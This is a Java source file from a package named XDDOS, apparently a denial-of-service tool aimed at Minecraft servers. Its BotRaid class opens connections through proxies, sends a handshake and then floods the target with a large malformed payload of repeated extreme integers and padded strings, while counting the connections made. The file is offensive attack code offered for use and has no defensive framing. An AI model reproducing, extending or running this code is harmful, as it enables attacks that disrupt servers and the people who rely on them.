package XD.XDDOS.methods.impl;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.zip.Deflater;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.PacketUtils;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class BotRaid 
    implements IMethod {
    private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);

    private byte[] bytes = this.handshake.getWrappedPacket();

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
        try {
            bbbb.write(bytes);
            bbbb.writeBytes(XDDOS.srvRecord);
            bbbb.writeInt(-2147483648);
            bbbb.writeInt(2147483647);
            bbbb.writeBytes(XDDOS.srvRecord);
            bbbb.write(XDDOS.port);
            for (int i = 0; i < 1900; i++) {
                bbbb.writeInt(2147483647);
                bbbb.writeInt(-2147483648);
                bbbb.writeChars(String.valueOf(String.valueOf(-2147483648)) + "\000\000\000\000\000\000\000\000" + 2147483647);
            }
        } catch (IOException ioException) {
            ioException.printStackTrace();
        }
        channel.writeAndFlush(b);
        channel.writeAndFlush(bbbb);
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
    }

    public byte[] compress(byte[] packet, int threshold) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        byte[] buffer = new byte[8192];
        if (packet.length >= threshold && threshold > 0) {
            byte[] data = new byte[packet.length];
            System.arraycopy(packet, 0, data, 0, packet.length);
            PacketUtils.writeVarInt(out, data.length);
            Deflater def = new Deflater();
            def.setInput(data, 0, data.length);
            def.finish();
            while (!def.finished()) {
                int i = def.deflate(buffer);
                out.write(buffer, 0, i);
            }
            def.reset();
        } else {
            PacketUtils.writeVarInt(out, 0);
            out.write(packet);
        }
        out.close();
        return bytes.toByteArray();
    }

    public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
        writeVarInt(packetData.length, out);
        out.write(packetData);
    }

    public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte(value & 0x7F | 0x80);
            value >>>= 7;
        }
        out.writeByte(value);
    }
}
